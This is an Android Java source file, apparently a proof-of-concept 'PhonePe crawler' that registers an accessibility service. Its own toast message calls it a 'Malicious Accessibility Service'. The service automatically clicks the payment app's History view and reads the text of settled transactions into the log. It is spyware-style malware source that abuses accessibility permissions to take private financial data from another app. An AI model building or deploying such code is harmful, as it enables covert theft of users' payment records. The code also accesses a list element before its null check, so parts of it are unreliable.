package com.example.phonepecrawler;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

import java.util.List;

public class CrawlerService extends AccessibilityService {
    //phonepe
    //static final String History = "History";
    //static final String Settled = "Settled";
    //static final String TAG = "test";

    static final String History = "History";
    static final String Settled = "Settled";
    static final String TAG = "test";
    @Override
    public void onServiceConnected() {
        Log.d(TAG, "Service connected");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.notificationTimeout = 100;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        this.setServiceInfo(info);
        Toast t = Toast.makeText(getApplicationContext(), "Malicious Accessibility Service is connected now", Toast.LENGTH_SHORT);
        t.show();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) {
            Log.d(TAG, "event is null");
            return;
        }
        AccessibilityNodeInfo rootNode = event.getSource();
        Log.d(TAG, "rootNode=" + rootNode);
        if (rootNode == null) {
            Log.d(TAG, "rootNode is null");
            return;
        }

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                Log.d(TAG, "enter case sentence");
                try {
                    Log.d(TAG, "enter try sentence");
                    List<AccessibilityNodeInfo> firstButtonList = rootNode.findAccessibilityNodeInfosByText(History);
                    Log.d(TAG, "firstButtonList2=" + firstButtonList.get(1));


                    if (firstButtonList == null || firstButtonList.isEmpty()) {
                        Log.d(TAG, "firstButtonList is Null");
                        return;
                    }
                    AccessibilityNodeInfo firstButton = firstButtonList.get(1).getParent();
                    Log.d(TAG, "" + firstButton);
                    firstButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Thread.sleep(4000);

                    List<AccessibilityNodeInfo> SettledTexts = rootNode.findAccessibilityNodeInfosByText(Settled);
                    Log.d(TAG, "SettledTexts=" + SettledTexts);
                    AccessibilityNodeInfo testNode = SettledTexts.get(0).getParent();
                    for (int i=0;i<testNode.getChildCount();i++) {
                        Log.d(TAG, "node : " + testNode.getChild(i).getText());
                    }
                }
                catch (Exception e) {
                    Log.e(TAG, "something when wrong : " + e);
                }
                break;

        }

    }

    @Override
    public void onInterrupt() {

    }
}